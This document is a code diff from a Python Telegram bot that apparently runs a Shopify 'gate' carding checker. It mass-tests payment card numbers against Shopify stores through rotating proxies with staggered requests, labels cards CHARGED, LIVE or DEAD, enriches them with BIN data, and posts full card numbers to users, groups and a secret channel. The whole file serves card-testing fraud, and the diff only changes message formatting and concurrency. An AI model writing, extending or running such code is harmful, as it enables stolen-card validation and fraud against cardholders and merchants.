-    uobj     = sess.get("user_obj")
-    ulink    = _user_link(uobj) if uobj else "User"
-    plan_eid = sess.get("plan_eid", PRO_EMOJI_ID)
+    ts    = _fmt_time(time.time() - sess["start_time"])
+    uobj  = sess.get("user_obj")
+    ulink = _user_link(uobj) if uobj else "User"
     return (
-        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Shopify</b>\n'
-        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
-        f'<b>Charged ➳ {sess["charged"]} <tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>\n'
-        f'<b>Live ➳ {sess["approved"]} <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
-        f'<b>Dead ➳ {sess["dead"]} <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
-        f'<b>Errors ➳ {sess["errors"]} <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
-        f'<b>Time ➳ {ts}</b>\n'
-        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ulink} '
-        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
-        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {DEV_LINK_HTML} '
-        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
+        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➛ Shopify</b>\n'
+        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➛ {sess["checked"]}/{sess["total"]}</b>\n'
+        f"<b>──────────</b>\n"
+        f'<b><tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji> Charged ➛ {sess["charged"]}</b>\n'
+        f'<b><tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji> Live    ➛ {sess["approved"]}</b>\n'
+        f'<b><tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji> Dead    ➛ {sess["dead"]}</b>\n'
+        f'<b><tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji> Errors  ➛ {sess["errors"]}</b>\n'
+        f"<b>──────────</b>\n"
+        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> Time ➛ {ts}</b>\n'
+        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> {ulink} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji>  |  <tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> {DEV_LINK_HTML}</b>'
     )
 
 
@@ -2411,7 +2281,7 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
     for cd in cards:
         bi    = cd.get("bin_info", {})
         flag  = bi.get("country_emoji", "")
-        cdisp = f"{bi.get('country','N/A').upper()}{flag}" if flag else bi.get("country","N/A").upper()
+        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
         resp  = _clean_resp(cd.get("resp", cd.get("response", "N/A")))
         ver   = cd.get("verdict", "N/A")
         prc   = cd.get("price", "0.00")
@@ -2465,27 +2335,24 @@ async def _send_hit(bot, user, text: str, verdict: str,
     if verdict == "CHARGED":
         status_line_g = (f'<b>{ch_link_g} HIT CHARGED '
                          f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>')
-        gate_txt  = f"Gate ➳ Shopify • {_fmt_price(price, currency)}"
+        gate_txt  = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
+        resp_te_g = f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji>'
     elif verdict == "TDS":
         status_line_g = (f'<b>{ch_link_g} HIT LIVE [3DS] '
                          f'<tg-emoji emoji-id="{live_eid_g}">✅</tg-emoji></b>')
-        gate_txt  = "Gate ➳ Shopify"
+        gate_txt  = "Gate ➛ Shopify"
+        resp_te_g = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
     else:
         status_line_g = (f'<b>{ch_link_g} HIT LIVE '
                          f'<tg-emoji emoji-id="{live_eid_g}">✅</tg-emoji></b>')
-        gate_txt  = "Gate ➳ Shopify"
+        gate_txt  = "Gate ➛ Shopify"
+        resp_te_g = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
 
     compact_html = (
         f"{status_line_g}\n"
-        f"\n"
-        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
-        f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
-        f"<b>{gate_txt}</b>\n"
         f"<b>──────────</b>\n"
-        f"<b>Resp ➳ {resp_disp}</b>\n"
-        f"<b>Info ➳ {_bin_str(bin_data)}</b>\n"
-        f"<b>──────────</b>\n"
-        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ulink} '
+        f"<b>{resp_te_g} Resp ➛ {resp_disp}</b>\n"
+        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ulink} '
         f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
     )
 
@@ -2512,6 +2379,7 @@ async def _send_hit(bot, user, text: str, verdict: str,
     # ── 3. Extra charged group — animation + compact card ────────────────────
     if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
         try:
+            await asyncio.sleep(0.3)
             eid_x = get_random_charged_emoji()
             await _send_as_media(bot, EXTRA_CHARGED_GROUP_ID, eid_x,
                                  caption=compact_html, parse_mode="HTML",
@@ -2526,19 +2394,16 @@ async def _send_hit(bot, user, text: str, verdict: str,
             sc_lbl = ("CHARGED 💎" if verdict == "CHARGED"
                       else "LIVE [3DS] ✅" if verdict == "TDS" else "LIVE ✅")
             sc_html = (
-                f"<b>HIT ➳ {sc_lbl}</b>\n"
-                f"\n"
-                f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
-                f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
+                f"<b>HIT ➛ {sc_lbl}</b>\n"
                 f"<b>{gate_txt}</b>\n"
                 f"<b>──────────</b>\n"
-                f"<b>Info ➳ {bin_s}</b>\n"
+                f"<b>💳 <code>{escape(card)}</code></b>\n"
+                f"<b>🏦 {bin_s}</b>\n"
                 f"<b>──────────</b>\n"
-                f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ulink} '
-                f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>\n'
-                f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {DEV_LINK_HTML} '
-                f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
+                f"<b>👤 {ulink} ⭐</b>\n"
+                f"<b>⚡ {DEV_LINK_HTML}</b>"
             )
+            await asyncio.sleep(0.2)
             await _send_as_media(bot, SECRET_CHANNEL_ID, eid,
                                  caption=sc_html, parse_mode="HTML",
                                  disable_notification=True)
@@ -2569,282 +2434,118 @@ def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id,
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SESSION CLEANUP  —  keeps MSH_SESSIONS lean in long runs
+# MASS CHECK RUNNER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_MSH_COMPLETED: dict = {}   # archived sessions (result buttons still work)
-_CLEANUP_STARTED = False    # guard — only one cleanup task ever
-
-
-async def _start_cleanup_if_needed() -> None:
-    """Schedule the background cleanup task once on the main bot loop."""
-    global _CLEANUP_STARTED
-    if not _CLEANUP_STARTED:
-        _CLEANUP_STARTED = True
-        asyncio.create_task(_session_cleanup_task())
-
-
-async def _session_cleanup_task() -> None:
-    """Background task: archive FINISHED/STOPPED sessions after 30 min,
-    delete from archive after 24 h.  Runs on the main bot loop.
-    """
-    SESSION_TTL = 1800    # 30 min before archiving
-    ARCHIVE_TTL = 86400   # 24 h before deleting from archive
-    while True:
-        try:
-            await asyncio.sleep(60)          # check every minute
-            now = time.time()
-            for sid in list(MSH_SESSIONS):
-                sess = MSH_SESSIONS.get(sid)
-                if not sess:
-                    continue
-                if sess.get("status") not in ("FINISHED", "STOPPED"):
-                    continue
-                end_t = sess.get("end_time") or sess.get("start_time") or now
-                try:
-                    end_t = float(end_t)
-                except (TypeError, ValueError):
-                    end_t = now
-                if now - end_t > SESSION_TTL:
-                    _MSH_COMPLETED[sid] = {
-                        k: sess.get(k) for k in (
-                            "user_id", "chat_id", "msg_id", "user_msg_id",
-                            "total", "checked", "charged", "approved",
-                            "dead", "errors", "status",
-                            "charged_cards", "live_cards", "dead_cards",
-                            "error_cards", "user_obj", "plan",
-                        )
-                    }
-                    _MSH_COMPLETED[sid]["archived_at"] = now
-                    MSH_SESSIONS.pop(sid, None)
-                    logging.info(f"[CLEANUP] Archived session {sid}")
-            for sid in list(_MSH_COMPLETED):
-                archived_at = float(_MSH_COMPLETED[sid].get("archived_at", now))
-                if now - archived_at > ARCHIVE_TTL:
-                    _MSH_COMPLETED.pop(sid, None)
-        except asyncio.CancelledError:
-            break
-        except Exception as exc:
-            logging.error(f"[CLEANUP] {exc}")
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MASS CHECK RUNNER  —  msh.py thread-pool architecture
-#
-# Each session runs inside a dedicated OS thread that owns its own asyncio
-# event loop.  Telegram progress/hit calls are submitted back to the main
-# bot loop via _fire() (run_coroutine_threadsafe, non-blocking).
-#
-# BIN is looked up FIRST (before the API call) so the result card always
-# shows real bank / country data instead of N/A.
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
-    """Entry point called from main.py.  Hands the session to a thread pool."""
     sess = MSH_SESSIONS.get(sid)
-    if not sess:
-        return
+    if not sess: return
 
-    effective_proxies = proxies if proxies else list(_ALL_PROXIES)
+    effective_proxies = proxies if proxies else _ALL_PROXIES
     if not effective_proxies:
         effective_proxies = _load_proxies()
 
-    # Prefer already-probed working-site cache
+    # Use probed working sites (no dead-site 404s).
+    # If probe hasn't run, fall back to full list then probe in background.
     if not all_sites:
         all_sites = get_working_sites()
     elif _WORKING_SITES:
+        # Prefer working-site cache over caller-supplied full list
         all_sites = list(_WORKING_SITES)
 
-    # Capture the bot’s main event loop so _fire() can reach it
-    main_loop = asyncio.get_event_loop()
-    _set_main_loop(main_loop)
-
-    logging.info(
-        f"[MSH] {sid} — {len(effective_proxies)} proxies "
-        f"{len(valid_cards)} cards  concurrency={MAX_CONCURRENT}"
-    )
-
-    # Run the entire session in a pool thread — non-blocking for the bot
-    await main_loop.run_in_executor(
-        _USER_THREAD_POOL,
-        _run_msh_session_thread,
-        bot, sid, valid_cards, user, plan, all_sites, effective_proxies, main_loop,
-    )
-
-
-def _run_msh_session_thread(
-    bot, sid, cards, user, plan, all_sites, proxies, main_loop
-):
-    """Runs inside a pool thread; creates its own event loop for this session."""
-    thread_loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(thread_loop)
-    sess = MSH_SESSIONS.get(sid)
-    if sess:
-        sess["thread_loop"] = thread_loop
-    try:
-        thread_loop.run_until_complete(
-            _msh_session_worker(bot, sid, cards, user, plan, all_sites, proxies)
-        )
-    except Exception as exc:
-        logging.error(f"[MSH] Session thread {sid} crashed: {exc}", exc_info=True)
-    finally:
-        try:
-            thread_loop.close()
-        except Exception:
-            pass
-
-
-async def _bin_prefetch(bin6: str) -> None:
-    """Pre-warm the BIN cache for one prefix.  Skips if already cached."""
-    if bin6 in _BIN_CACHE and not _bin_empty(_BIN_CACHE.get(bin6, {})):
-        return
-    try:
-        result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=5)
-        _BIN_CACHE[bin6] = result if result else {}
-    except Exception:
-        _BIN_CACHE.setdefault(bin6, {})
-
-
-async def _msh_session_worker(bot, sid, cards, user, plan, all_sites, proxies):
-    """Core async worker running in the session’s private event loop."""
-    sess = MSH_SESSIONS.get(sid)
-    if not sess:
-        return
-
-    # Start session cleanup task once on the main bot loop
-    _fire(_start_cleanup_if_needed())
-
-    # ── Per-session BIN dedup via asyncio.Event ────────────────────────
-    # Checking starts IMMEDIATELY — no blocking pre-fetch.
-    # First worker per unique BIN prefix fetches it (4 s timeout);
-    # all other workers for the same prefix wait on an asyncio.Event.
-    # Each unique BIN is fetched exactly once per session.
-    _local_bin_events: dict = {}   # bin6 → asyncio.Event (loop-local)
-
-    async def _bin_get_local(bin6: str) -> dict:
-        # Fast path: already in global cache
-        hit = _BIN_CACHE.get(bin6)
-        if hit is not None:
-            return hit
-        # Another coroutine is already fetching this BIN — wait for it
-        if bin6 in _local_bin_events:
-            try:
-                await asyncio.wait_for(_local_bin_events[bin6].wait(), timeout=6)
-            except asyncio.TimeoutError:
-                pass
-            return _BIN_CACHE.get(bin6) or {}
-        # We are the first — claim the slot and fetch
-        ev = asyncio.Event()
-        _local_bin_events[bin6] = ev
-        try:
-            result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=4)
-            _BIN_CACHE[bin6] = result if result else {}
-        except Exception:
-            _BIN_CACHE[bin6] = {}
-        finally:
-            ev.set()    # wake up all waiters
-        return _BIN_CACHE.get(bin6) or {}
-
+    logging.info(f"[MSH] {sid} — {len(effective_proxies)} proxies "
+                 f"{len(valid_cards)} cards concurrency={MAX_CONCURRENT}")
     sem = asyncio.Semaphore(MAX_CONCURRENT)
 
     async def worker(card_fmt: str, cc_num: str):
-        if sess.get("status") != "CHECKING":
-            return
+        if sess.get("status") != "CHECKING": return
         async with sem:
-            if sess.get("status") != "CHECKING":
-                return
-
+            if sess.get("status") != "CHECKING": return
             t0 = time.time()
-
-            # ── 1. BIN — lazy fetch with per-BIN dedup (no startup delay) ──────
-            bin6     = cc_num[:6]
-            bin_data = await _bin_get_local(bin6)
-
-            # ── 2. Card check ──────────────────────────────────────────────────
             try:
                 verdict, resp, price, currency = await _check_card_with_retry(
-                    None, card_fmt, all_sites, proxies,
+                    None, card_fmt, all_sites, effective_proxies,
                     max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid,
                 )
             except asyncio.CancelledError:
                 return
-            except Exception as exc:
-                verdict, resp, price, currency = "ERROR", str(exc)[:60], "0.00", "USD"
+            except Exception as e:
+                verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"
 
             elapsed  = time.time() - t0
-            raw_resp = resp
+            raw_resp = resp          # keep real API text — never sanitise before storing
+            try:
+                bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
+            except Exception:
+                bin_data = {}
+
             rec = {
                 "card": card_fmt, "verdict": verdict,
-                "resp": raw_resp,  "response": raw_resp,
-                "price": price,    "currency": currency,
-                "bin_info": bin_data,
+                "resp": raw_resp, "response": raw_resp,
+                "price": price, "currency": currency, "bin_info": bin_data,
             }
             sess["checked"] += 1
 
-            # ── 3. Update session counts + fire Telegram notifications ─────────────
             if verdict == "CHARGED":
                 sess["charged"] += 1
                 sess["charged_cards"].append(rec)
-                dm_html = build_result_msg(
-                    card_fmt, resp, verdict, bin_data,
-                    price, currency, elapsed, user, plan
-                )
-                _fire(_send_hit(
-                    bot, user, dm_html, "CHARGED",
-                    card=card_fmt, bin_data=bin_data,
-                    price=price, currency=currency,
+                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
+                                            price, currency, elapsed, user, plan)
+                asyncio.create_task(_send_hit(
+                    bot, user, _dm_html, "CHARGED",
+                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
                     plan=plan, resp=raw_resp,
                 ))
-                _fire(_update_progress(bot, sid, force=True))
+                asyncio.create_task(_update_progress(bot, sid, force=True))
 
             elif verdict == "TDS":
                 sess["approved"] += 1
                 sess["live_cards"].append(rec)
                 sess["tds_cards"].append(rec)
-                dm_html = build_result_msg(
-                    card_fmt, resp, verdict, bin_data,
-                    price, currency, elapsed, user, plan
-                )
-                _fire(_send_hit(
-                    bot, user, dm_html, "TDS",
-                    card=card_fmt, bin_data=bin_data,
-                    price=price, currency=currency,
+                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
+                                            price, currency, elapsed, user, plan)
+                asyncio.create_task(_send_hit(
+                    bot, user, _dm_html, "TDS",
+                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
                     plan=plan, resp=raw_resp,
                 ))
-                _fire(_update_progress(bot, sid, force=True))
+                asyncio.create_task(_update_progress(bot, sid, force=True))
 
             elif verdict == "LIVE":
                 sess["approved"] += 1
                 sess["live_cards"].append(rec)
-                dm_html = build_result_msg(
-                    card_fmt, resp, verdict, bin_data,
-                    price, currency, elapsed, user, plan
-                )
-                _fire(_send_hit(
-                    bot, user, dm_html, "LIVE",
-                    card=card_fmt, bin_data=bin_data,
-                    price=price, currency=currency,
+                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
+                                            price, currency, elapsed, user, plan)
+                asyncio.create_task(_send_hit(
+                    bot, user, _dm_html, "LIVE",
+                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
                     plan=plan, resp=raw_resp,
                 ))
-                _fire(_update_progress(bot, sid, force=True))
+                asyncio.create_task(_update_progress(bot, sid, force=True))
 
             elif verdict == "DEAD":
                 sess["dead"] += 1
                 sess["dead_cards"].append(rec)
 
-            else:   # ERROR
+            else:
                 sess["errors"] += 1
                 sess["error_cards"].append(rec)
 
-            # Progress update after every card
-            _fire(_update_progress(bot, sid))
+            # Update progress after every single card so user sees real-time counts
+            asyncio.create_task(_update_progress(bot, sid))
 
-    # Launch all card tasks with the configured stagger
+    # Launch workers one at a time with a stagger delay so:
+    # • Each card gets its own slice of the site pool
+    # • The user sees cards finishing one by one (not all at once)
+    # • The API is not hammered with 20 simultaneous calls
     tasks = []
-    for cf, cn in cards:
+    for i, (cf, cn) in enumerate(valid_cards):
         if sess.get("status") != "CHECKING":
             break
         t = asyncio.create_task(worker(cf, cn))
         tasks.append(t)
+        # Wait for CARD_STAGGER seconds before launching the next card.
+        # This also naturally throttles the API — each card checks
+        # a different set of sites because the pool is shuffled fresh per card.
         await asyncio.sleep(CARD_STAGGER)
 
     sess["tasks"] = tasks
@@ -2852,12 +2553,11 @@ async def _msh_session_worker(bot, sid, cards, user, plan, all_sites, proxies):
 
     if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
         MSH_SESSIONS[sid]["status"] = "FINISHED"
-    _fire(_update_progress(bot, sid, force=True))
+    await _update_progress(bot, sid, force=True)
 
-    logging.info(
-        f"[MSH] {sid} done  C:{sess['charged']} L:{sess['approved']} "
-        f"D:{sess['dead']} E:{sess['errors']}"
-    )
+    logging.info(f"[MSH] {sid} done  C:{sess['charged']} L:{sess['approved']} "
+                 f"D:{sess['dead']} E:{sess['errors']}")
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CALLBACK HANDLERS
@@ -2980,10 +2680,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # ── Spinner (initial "Checking..." message) ───────────────────────────────
     spin = await update.message.reply_text(
-        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Shopify</b>\n'
-        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ 0/1</b>\n'
-        f'<b>Live ➳ 0 <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
-        f"<b>──────────</b>",
+        "<b>🛒 Gate ➛ Shopify</b>\n<b>🔄 Checking...</b>",
         parse_mode="HTML"
     )
 
@@ -3001,9 +2698,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # If probe has never run and all sites look dead, warn user briefly
     if not _WORKING_SITES:
         await spin.edit_text(
-            f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Shopify</b>\n'
-            f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Finding live sites... please wait</b>\n'
-            f"<b>──────────</b>",
+            "<b>🛒 Gate ➛ Shopify</b>\n<b>🔄 Finding live sites... please wait</b>",
             parse_mode="HTML"
         )
         # Block until probe finishes (only for single check, to get real result)
